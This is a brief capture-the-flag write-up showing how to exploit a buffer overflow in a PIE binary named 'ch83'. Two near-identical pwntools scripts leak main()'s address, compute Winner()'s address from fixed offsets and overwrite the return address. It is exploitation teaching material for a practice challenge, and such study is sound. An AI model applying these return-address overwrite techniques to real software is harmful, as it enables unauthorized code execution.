# Buffer Overflow PIE

it Explains how to exploit a **buffer overflow** vulnerability in a binary compiled with **PIE** (Position Independent Executable) and protections such as **ASLR**. The goal is to redirect execution to the `Winner()` function using the address of the `main()` function.

***

#### **Objectives**

1. **Leak the address of `main()`**.
2. **Calculate the address of `Winner()`** using offsets.
3. **Exploit the vulnerability to redirect execution to `Winner()`**.

***

#### Solution 1: Exploit using Pwntools and address extraction

```python
from pwn import *

context.arch = "amd64"
context.endian = "little"

p = process("./ch83")
a = p.recv()
main_off = 0x91a
win_off = 0x87a
main_ret = a.split(b"main():")[1].strip()
main_ret = int(main_ret, 16)
p.sendline(b"A"*40 + p64(main_ret - main_off + win_off))
print(p.recv())

```

#### **Solution 2: Exploit using Pwntools (dynamic address calculation)**

```python
from pwn import *

context.arch = "amd64"
context.endian = "little"

p = process("./ch83")
a = p.recv()
main_off = 0x91a 
win_off = 0x87a 

main_ret = a.split(b"main():")[1].strip()
main_ret = int(main_ret, 16)

winner_addr = main_ret - main_off + win_off

payload = b"A" * 40 
payload += p64(winner_addr)

p.sendline(b"A"*40 + p64(main_ret - main_off + win_off))
print(p.recv())


```
